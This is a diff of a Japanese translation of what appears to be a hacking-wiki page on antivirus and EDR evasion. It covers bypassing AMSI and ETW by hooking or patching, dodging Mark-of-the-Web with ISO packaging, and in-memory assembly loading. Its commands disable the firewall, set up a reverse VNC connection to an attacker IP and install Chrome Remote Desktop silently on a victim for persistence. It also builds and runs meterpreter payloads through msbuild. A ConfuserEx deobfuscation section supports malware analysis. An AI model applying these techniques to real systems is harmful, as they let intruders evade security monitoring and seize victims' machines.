+### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)
 
-AMSI は現在のプロセスに `amsi.dll` がロードされた後に初期化されます。言語非依存で堅牢なバイパス手法として、要求されたモジュールが `amsi.dll` の場合にエラーを返すよう `ntdll!LdrLoadDll` に user‑mode hook を設置する方法があります。その結果、AMSI はロードされず、そのプロセスではスキャンが行われません。
+AMSI は現在のプロセスに `amsi.dll` がロードされた後にのみ初期化されます。言語に依存しない堅牢なバイパス方法は、ユーザーモードで `ntdll!LdrLoadDll` にフックを設置し、要求されたモジュールが `amsi.dll` の場合にエラーを返すことです。その結果、AMSI は決してロードされず、そのプロセスではスキャンは行われません。
 
-実装の概要 (x64 C/C++ pseudocode):
+実装概要（x64 C/C++ 疑似コード）:
 ```c
 #include <windows.h>
 #include <winternl.h>
@@ -291,71 +322,71 @@ realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
 }
 ```
 注意
-- PowerShell、WScript/CScript、およびカスタムローダーなど、AMSIをロードするものすべてで動作します（通常はAMSIをロードするもの全般）。
-- スクリプトを標準入力（stdin）経由で渡す（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせて、長いコマンドラインの痕跡を避けます。
-- LOLBins経由で実行されるローダー（例: `regsvr32` が `DllRegisterServer` を呼ぶ）の使用例が確認されています。
+- PowerShell、WScript/CScript、custom loaders などで動作します（AMSI をロードするあらゆるものに対して機能します）。
+- 長いコマンドラインの痕跡を避けるために、スクリプトを stdin 経由（`PowerShell.exe -NoProfile -NonInteractive -Command -`）で渡すと組み合わせて使用してください。
+- LOLBins 経由で実行される loaders によって使用されるのが確認されています（例: `regsvr32` が `DllRegisterServer` を呼び出す場合）。
 
 このツール [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) は AMSI をバイパスするスクリプトも生成します。
 
-**検出されたシグネチャを削除する**
+**検出されたシグネチャの除去**
 
-**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使用して、現在のプロセスのメモリから検出されたAMSIシグネチャを削除できます。これらのツールは、現在のプロセスのメモリをスキャンしてAMSIシグネチャを検出し、それを NOP 命令で上書きしてメモリから事実上削除します。
+現在のプロセスのメモリから検出された AMSI シグネチャを削除するために、**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使用できます。これらのツールは現在のプロセスのメモリをスキャンして AMSI シグネチャを探し、NOP 命令で上書きしてメモリから実質的に取り除きます。
 
-**AMSIを使用するAV/EDR製品**
+**AMSI を使用する AV/EDR 製品**
 
-AMSIを使用するAV/EDR製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。
+AMSI を使用する AV/EDR 製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。
 
-**PowerShell version 2 を使用する**
-PowerShell version 2 を使用すると、AMSI はロードされないため、スクリプトを AMSI によるスキャンなしで実行できます。次のように実行します:
+**PowerShell version 2 を使う**
+PowerShell version 2 を使用すると AMSI はロードされないため、スクリプトを AMSI によるスキャンなしで実行できます。次のように実行できます:
 ```bash
 powershell.exe -version 2
 ```
 ## PS ロギング
 
-PowerShell logging はシステム上で実行されたすべての PowerShell コマンドを記録する機能です。これは監査やトラブルシューティングに役立ちますが、検出を回避したい攻撃者にとっては **問題になり得ます**。
+PowerShell ロギングは、システム上で実行されたすべての PowerShell コマンドをログに記録できる機能です。監査やトラブルシューティングに役立ちますが、検出を回避しようとする攻撃者にとっては問題になることもあります。
 
-PowerShell ロギングをバイパスするには、次の手法を使用できます:
+PowerShell ロギングを回避するには、次のテクニックを使用できます:
 
 - **Disable PowerShell Transcription and Module Logging**: この目的には [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
-- **Use Powershell version 2**: PowerShell version 2 を使うと AMSI はロードされないため、スクリプトを AMSI によるスキャンなしで実行できます。次のようにします: `powershell.exe -version 2`
-- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って防御機能のない powershell を起動します（これは Cobal Strike の `powerpick` が使う方法です）。
+- **Use Powershell version 2**: PowerShell version 2 を使用すると AMSI はロードされないため、AMSI によるスキャンを受けずにスクリプトを実行できます。実行例: `powershell.exe -version 2`
+- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って防御のない powershell を起動します（これは Cobal Strike の `powerpick` が使う方法です）。
 
 
-## 難読化
+## Obfuscation
 
 > [!TIP]
-> いくつかの難読化手法はデータを暗号化することに依存しており、これによりバイナリのエントロピーが増加して AVs や EDRs に検出されやすくなります。これには注意し、暗号化はセンシティブな部分や隠す必要がある特定セクションにのみ適用することを検討してください。
+> いくつかの難読化技術はデータを暗号化することに依存しており、結果としてバイナリのエントロピーが増加し、AV や EDR による検出が容易になる場合があります。これに注意し、暗号化は機密性の高いコードや隠す必要がある特定のセクションのみに適用することを検討してください。
 
-### ConfuserEx によって保護された .NET バイナリの難読化解除
+### Deobfuscating ConfuserEx-Protected .NET Binaries
 
-ConfuserEx 2（または商用フォーク）を使用するマルウェアを解析すると、複数の保護レイヤによりデコンパイラやサンドボックスが阻害されることがよくあります。以下のワークフローは、後で dnSpy や ILSpy などのツールで C# にデコンパイルできる、ほぼオリジナルの IL を確実に **復元します**。
+ConfuserEx 2（または商用フォーク）を使用するマルウェアを解析すると、デコンパイラやサンドボックスを阻害する複数の保護レイヤーに直面することがよくあります。以下のワークフローは、後で dnSpy や ILSpy などのツールで C# にデコンパイルできる、ほぼ元の IL を確実に復元します。
 
-1.  改竄防止の除去 – ConfuserEx はすべての *method body* を暗号化し、*module* の静的コンストラクタ (`<Module>.cctor`) 内で復号します。これにより PE チェックサムもパッチされ、改変するとバイナリがクラッシュします。暗号化されたメタデータテーブルを特定し、XOR キーを回復してクリーンなアセンブリを書き直すために **AntiTamperKiller** を使用してください：
+1.  Anti-tampering removal – ConfuserEx はすべての *method body* を暗号化し、それらを *module* の static コンストラクタ (`<Module>.cctor`) 内で復号します。これにより PE チェックサムもパッチされ、変更するとバイナリがクラッシュします。**AntiTamperKiller** を使って暗号化されたメタデータテーブルを特定し、XOR キーを回復してクリーンなアセンブリを書き換えます:
 ```bash
 # https://github.com/wwh1004/AntiTamperKiller
 python AntiTamperKiller.py Confused.exe Confused.clean.exe
 ```
-出力には、独自のアンパッカーを作る際に役立つ6つの改竄防止パラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれます。
+出力には 6 つの anti-tamper パラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれており、独自のアンパッカを作る際に役立ちます。
 
-2.  シンボル／制御フローの回復 – *clean* ファイルを **de4dot-cex**（ConfuserEx 対応の de4dot フォーク）に渡します。
+2.  Symbol / control-flow recovery – *clean* ファイルを **de4dot-cex**（de4dot の ConfuserEx 対応フォーク）に渡します。
 ```bash
 de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
 ```
-フラグ:
+Flags:
 • `-p crx` – ConfuserEx 2 プロファイルを選択  
-• de4dot は制御フローのフラット化を元に戻し、元の名前空間、クラス、変数名を復元し、定数文字列を復号します。
+• de4dot は control-flow flattening を元に戻し、元の namespaces、classes、変数名を復元し、定数文字列を復号します。
 
-3.  Proxy-call の除去 – ConfuserEx はデコンパイルをさらに困難にするために直接のメソッド呼び出しを軽量のラッパー（いわゆる *proxy calls*）に置換します。これらは **ProxyCall-Remover** で除去してください：
+3.  Proxy-call stripping – ConfuserEx は直接のメソッド呼び出しを軽量なラッパー（いわゆる *proxy calls*）に置き換えてデコンパイルをさらに困難にします。**ProxyCall-Remover** でそれらを除去します:
 ```bash
 ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
 ```
-この手順の後、曖昧なラッパー関数（`Class8.smethod_10` など）ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が観察できるはずです。
+このステップの後は、不透明なラッパー関数（`Class8.smethod_10` など）ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が見られるはずです。
 
-4.  手動クリーンアップ – 得られたバイナリを dnSpy で実行し、大きな Base64 のブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用を検索して *実際の* ペイロードを特定します。多くの場合、マルウェアはそれを TLV エンコードされたバイト配列として `<Module>.byte_0` 内で初期化して格納しています。
+4.  Manual clean-up – 生成されたバイナリを dnSpy で実行して、大きな Base64 ブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を探し、*real* ペイロードを特定します。多くの場合、マルウェアは `<Module>.byte_0` 内で初期化された TLV エンコードされたバイト配列として格納しています。
 
-上記の手順により、悪意のあるサンプルを実行することなく**実行フローを復元**できます — オフラインの作業環境で作業する際に有用です。
+上記のチェーンはマルウェアサンプルを実行することなく実行フローを復元するため、オフラインのワークステーションで作業する際に便利です。
 
-> 🛈 ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これはサンプルを自動的にトリアージする IOC として使用できます。
+> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これはサンプルの自動トリアージ用の IOC として利用できます。
 
 #### ワンライナー
 ```bash
@@ -364,37 +395,37 @@ autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
 ---
 
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
-- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と tamper-proofing を通じてソフトウェアのセキュリティを高めることです。
-- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は `C++11/14` 言語を用いて、コンパイル時に外部ツールやコンパイラの変更を行わずに obfuscated code を生成する方法を示します。
-- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework によって生成される obfuscated operations のレイヤーを追加し、アプリケーションの解析や crack を試みる人の手間を多少増やします。
-- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 binary obfuscator で、.exe、.dll、.sys を含むさまざまな pe files を obfuscate できます。
-- [**metame**](https://github.com/a0rtega/metame): Metame は任意の executables 向けのシンプルな metamorphic code engine です。
-- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を使用する LLVM-supported languages 向けの細粒度の code obfuscation framework です。ROPfuscator は通常の命令を ROP chains に変換することで、アセンブリコードレベルでプログラムを obfuscate し、通常の制御フローの概念を妨げます。
+- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソース fork を提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と tamper-proofing を通じてソフトウェアのセキュリティを向上させることです。
+- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は、`C++11/14` 言語を使用して、コンパイル時に外部ツールを使わず、コンパイラを変更することなく obfuscated code を生成する方法を示します。
+- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework によって生成される obfuscated operations のレイヤーを追加し、アプリケーションを解析しようとする者の作業を多少困難にします。
+- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は .exe、.dll、.sys を含むさまざまな pe ファイルを obfuscate できる x64 binary obfuscator です。
+- [**metame**](https://github.com/a0rtega/metame): Metame は arbitrary executables 向けのシンプルな metamorphic code engine です。
+- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を使用する、LLVM 対応言語向けの細粒度な code obfuscation framework です。ROPfuscator は通常の命令を ROP チェーンに変換することでアセンブリレベルでプログラムを obfuscate し、通常の制御フローの理解を阻害します。
 - [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です
 - [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換してロードすることができます
 
 ## SmartScreen & MoTW
 
-You may have seen this screen when downloading some executables from the internet and executing them.
+インターネットからいくつかの実行ファイルをダウンロードして実行するときに、この画面を見たことがあるかもしれません。
 
-Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.
+Microsoft Defender SmartScreen は、潜在的に悪意のあるアプリケーションの実行からエンドユーザを保護するためのセキュリティ機構です。
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).
+SmartScreen は主にレピュテーションベースのアプローチで動作します。つまり、あまりダウンロードされていないアプリケーションは SmartScreen をトリガーし、ファイルの実行を警告・阻止します（ただし、More Info -> Run anyway をクリックすることで実行は可能です）。
 
-**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.
+**MoTW** (Mark of The Web) は Zone.Identifier という名前の [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、インターネットからファイルをダウンロードした際に自動的に作成され、ダウンロード元の URL を格納します。
 
 <figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認しているところ。</p></figcaption></figure>
 
 > [!TIP]
-> 重要なのは、**信頼された** 署名証明書で署名された実行ファイルは **SmartScreen を起動しない** という点です。
+> **信頼された**署名証明書で署名された実行ファイルは **SmartScreen をトリガーしない** ことに注意してください。
 
-A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.
+payload が Mark of The Web を付与されるのを防ぐ非常に有効な方法は、ISO のようなコンテナにパッケージングすることです。これは Mark-of-the-Web (MOTW) が **non NTFS** ボリュームには **適用できない** ためです。
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、ペイロードを出力コンテナにパッケージ化して Mark-of-the-Web を回避するツールです。
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、payload を出力コンテナにパッケージして Mark-of-the-Web を回避するツールです。
 
 Example usage:
 ```bash
@@ -424,51 +455,51 @@ Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files 
 
 ## ETW
 
-Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントがイベントを**ログする**ための強力な Windows のログ機構です。しかし、セキュリティ製品が悪意ある活動を監視・検出するために利用することもあります。
+Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントが**イベントを記録する**ための強力なログ機構です。しかし、セキュリティ製品が悪意ある活動を監視・検出するために利用することもあります。
 
-AMSI が無効化（バイパス）される方法と同様に、ユーザ空間プロセスの **`EtwEventWrite`** 関数をイベントをログせずに即座に戻るようにすることも可能です。これは関数をメモリ上でパッチして即座に戻すようにすることで行われ、そのプロセスに対する ETW ロギングを事実上無効化します。
+AMSI を無効化（バイパス）する方法と同様に、ユーザ空間プロセスの **`EtwEventWrite`** 関数をイベントを記録せずに即座に return させることも可能です。これは関数をメモリ上でパッチして即時 return させることで実現され、そのプロセスに対する ETW ロギングを事実上無効化します。
 
-You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
+詳細は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。
 
 
-## C# アセンブリのリフレクション
+## C# Assembly Reflection
 
-C# バイナリをメモリ内でロードする手法は以前から知られており、AV に検出されずにポストエクスプロイトツールを実行するための非常に有効な方法です。
+C# バイナリをメモリ上で読み込む手法は以前から知られており、AV に検出されずに post-exploitation ツールを実行する非常に有効な手段です。
 
-ペイロードがディスクに触れることなく直接メモリにロードされるため、プロセス全体について AMSI をパッチすることだけを気にすればよくなります。
+ペイロードがディスクに触れず直接メモリにロードされるため、プロセス全体に対する AMSI のパッチだけを心配すれば良くなります。
 
-ほとんどの C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) は既に C# アセンブリをメモリ上で直接実行する機能を提供していますが、実行方法にはいくつかの違いがあります:
+ほとんどの C2 フレームワーク（sliver, Covenant, metasploit, CobaltStrike, Havoc など）は既に C# アセンブリをメモリ上で直接実行する機能を備えていますが、実行方法にはいくつかの違いがあります:
 
 - **Fork\&Run**
 
-これは新しい犠牲プロセスを**生成**し、その新プロセスにポストエクスプロイトの悪意あるコードを注入して実行し、終了したらそのプロセスを終了させる手法です。利点と欠点の両方があります。fork and run の利点は、実行が我々の Beacon インプラントプロセスの**外部**で行われることです。つまり、ポストエクスプロイトの動作で何かが失敗したり検出されたりしても、我々のインプラントが生き残る**可能性がずっと高い**ということです。欠点は、**Behavioural Detections** に検出される**可能性が高くなる**点です。
+新しい犠牲プロセスを**生成（spawn）**し、そのプロセスに post-exploitation の悪性コードを注入して実行し、終了したらそのプロセスを殺す手法です。利点と欠点があります。利点は実行が Beacon implant プロセスの**外部で行われる**ため、post-exploitation の動作で問題が起きても implant が生き残る可能性が高い点です。欠点は Behavioural Detections に捕捉される確率が高くなる点です。
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
 - **Inline**
 
-これはポストエクスプロイトの悪意あるコードを**自身のプロセスに注入**する手法です。これにより新しいプロセスを作成して AV にスキャンされるのを避けられますが、ペイロードの実行で問題が発生した場合にプロセスがクラッシュしてビーコンを失う**可能性が高くなる**という欠点があります。
+自分自身のプロセスに post-exploitation の悪性コードを注入する方法です。新規プロセスを作成して AV にスキャンされるリスクを避けられますが、ペイロードの実行で問題が起きるとプロセスがクラッシュして beacon を**失う可能性が高い**という欠点があります。
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
+> C# Assembly ロードについて詳しく知りたい場合はこの記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) とその InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください。
 
-PowerShell からも C# アセンブリをロードできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を参照してください。
+また、PowerShell から C# Assemblies をロードすることも可能です。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を参照してください。
 
 ## Using Other Programming Languages
 
-As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.
+[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、攻撃者が管理する SMB シェア上にインストールされたインタプリタ環境に、侵害されたマシンがアクセスできるようにすることで、他の言語を使って悪性コードを実行することが可能です。
 
-SMB 共有上のインタープリタバイナリや環境へのアクセスを許可することで、侵害されたマシンのメモリ内でこれらの言語による任意のコードを**実行する**ことが可能になります。
+SMB シェア上のインタプリタバイナリと環境へのアクセスを許可することで、侵害マシンのメモリ内でこれらの言語による任意コードを実行できます。
 
-The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.
+リポジトリでは、Defender はスクリプトをスキャンするが、Go, Java, PHP 等を利用することで**静的シグネチャを回避する柔軟性が増す**と示しています。これらの言語でのランダムな非難号化 reverse shell スクリプトでのテストは成功を示しています。
 
 ## TokenStomping
 
-Token stomping は、攻撃者がアクセス トークンや EDR や AV のようなセキュリティ製品を**操作する**ことで、プロセスが終了しないように権限を落としつつ、悪意ある活動を検出する権限を持たせない状態にする手法です。
+Token stomping は、攻撃者がアクセス トークンや EDR や AV のようなセキュリティプロダクトを**操作して権限を低下させ**、プロセスが終了しないようにしつつも悪性活動を検出・確認する権限を持たせないようにする技術です。
 
-これを防ぐために Windows はセキュリティプロセスのトークンに対して外部プロセスがハンドルを取得するのを**防止する**ようにすることが考えられます。
+これを防ぐために、Windows はセキュリティプロセスのトークンに対して外部プロセスがハンドルを取得することを制限するべきです。
 
 - [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
 - [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
@@ -478,28 +509,25 @@ Token stomping は、攻撃者がアクセス トークンや EDR や AV のよ�
 
 ### Chrome Remote Desktop
 
-As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
-1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
-2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
-3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
-4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin without using the GUI).
-
+[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) に示されているように、被害者の PC に Chrome Remote Desktop を展開し、これを使って乗っ取りと永続化を行うのは簡単です:
+1. https://remotedesktop.google.com/ からダウンロードし、"Set up via SSH" をクリックし、Windows 用の MSI ファイルをクリックしてダウンロードします。
+2. 被害者側でインストーラをサイレント実行（管理者権限が必要）: `msiexec /i chromeremotedesktophost.msi /qn`
+3. Chrome Remote Desktop のページに戻り、Next をクリックします。ウィザードは認可を求めるので、続行するには Authorize ボタンをクリックします。
+4. 指定されたパラメータをいくつか調整して実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（GUI を使わずに pin を設定できる点に注意）
 
 ## Advanced Evasion
 
-Evasion は非常に複雑なトピックで、単一のシステムで複数の異なるテレメトリソースを考慮する必要があることが多く、成熟した環境で完全に検出を免れるのはほぼ不可能です。
+Evasion は非常に複雑なトピックで、単一のシステム内で多数の異なるテレメトリソースを考慮する必要があるため、成熟した環境で完全に検出を免れるのはほぼ不可能です。
 
-攻撃対象となる環境ごとに強みと弱みは異なります。
+対峙する各環境にはそれぞれ強みと弱みがあります。
 
-より高度な Evasion 手法に触れるために、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強くお勧めします。
-
+より高度な Evasion 技術を学ぶために、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強く勧めます。
 
 {{#ref}}
 https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
 {{#endref}}
 
-これは [@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth の別の優れたトークです。
-
+これはまた、[@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth の素晴らしい講演です。
 
 {{#ref}}
 https://www.youtube.com/watch?v=IbA7Ung39o4
@@ -509,49 +537,49 @@ https://www.youtube.com/watch?v=IbA7Ung39o4
 
 ### **Check which parts Defender finds as malicious**
 
-You can use [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) which will **remove parts of the binary** until it **finds out which part Defender** is finding as malicious and split it to you.\
-Another tool doing the **same thing is** [**avred**](https://github.com/dobin/avred) with an open web offering the service in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
+[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、Defender がどの部分を悪性と検出しているかを特定するためにバイナリの一部を**削除しながら**調べ、問題の部分を切り分けてくれます。\
+同様のことを行うもう一つのツールは [**avred**](https://github.com/dobin/avred) で、サービスを公開しているウェブは [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) です。
 
 ### **Telnet Server**
 
-Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
+Windows10 以前のすべての Windows では、管理者権限でインストールできる **Telnet server** が付属していました。
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-システム起動時に**開始**し、今すぐ**実行**してください:
+システム起動時に**start**するように設定し、今**run**してください:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
-**telnet portを変更**（ステルス）およびファイアウォールを無効化:
+**telnetポートを変更する** (ステルス) および firewall を無効化:
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin ダウンロードを利用し、setup ではないものを選んでください)
+ダウンロード: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（bin ダウンロードを選択してください、setup ではありません）
 
-**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:
+**ON THE HOST**: _**winvnc.exe**_ を実行し、サーバを設定する:
 
 - オプション _Disable TrayIcon_ を有効にする
 - _VNC Password_ にパスワードを設定する
 - _View-Only Password_ にパスワードを設定する
 
-その後、バイナリ _**winvnc.exe**_ と **新しく** 作成されたファイル _**UltraVNC.ini**_ を **victim** の中に移動します
+次に、バイナリ _**winvnc.exe**_ と **新たに** 作成されたファイル _**UltraVNC.ini**_ を **victim** 内に移動する
 
 #### **Reverse connection**
 
-The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+The **attacker** は自身の **host** 内でバイナリ `vncviewer.exe -listen 5900` を実行して、リバース **VNC connection** を受ける準備をする。次に、**victim** 側では: winvnc デーモンを `winvnc.exe -run` で起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行する
 
-**警告:** ステルスを維持するために、以下のことを行ってはいけません
+**WARNING:** ステルスを維持するためにいくつか行ってはいけないことがある
 
-- 既に実行中の場合は `winvnc` を起動しないこと。起動すると [ポップアップ](https://i.imgur.com/1SROTTl.png) が表示されます。実行中かどうかは `tasklist | findstr winvnc` で確認してください
-- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないこと。起動すると [設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開きます
-- ヘルプを表示するために `winvnc -h` を実行しないこと。実行すると [ポップアップ](https://i.imgur.com/oc18wcu.png) が表示されます
+- `winvnc` が既に実行中の場合は起動しない（起動すると [ポップアップ](https://i.imgur.com/1SROTTl.png) が表示される）。`tasklist | findstr winvnc` で実行中か確認する
+- `UltraVNC.ini` が同じディレクトリにない状態で `winvnc` を起動しない（起動すると [設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開く）
+- ヘルプ目的で `winvnc -h` を実行しない（実行すると [ポップアップ](https://i.imgur.com/oc18wcu.png) が表示される）
 
 ### GreatSCT
 
-Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
+ダウンロード: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
 ```
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup/
@@ -569,23 +597,23 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-次に **lister を起動** を `msfconsole -r file.rc` で行い、**実行** する **xml payload** は次のとおりです:
+今、`msfconsole -r file.rc` で**リスナーを起動**し、次のコマンドで**xml payload**を**実行**します:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
-**現在の defender はプロセスを非常に速く終了します。**
+**現在の Defender はプロセスを非常に速く終了させます。**
 
-### 自前の reverse shell をコンパイルする
+### 自分の reverse shell をコンパイルする
 
 https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
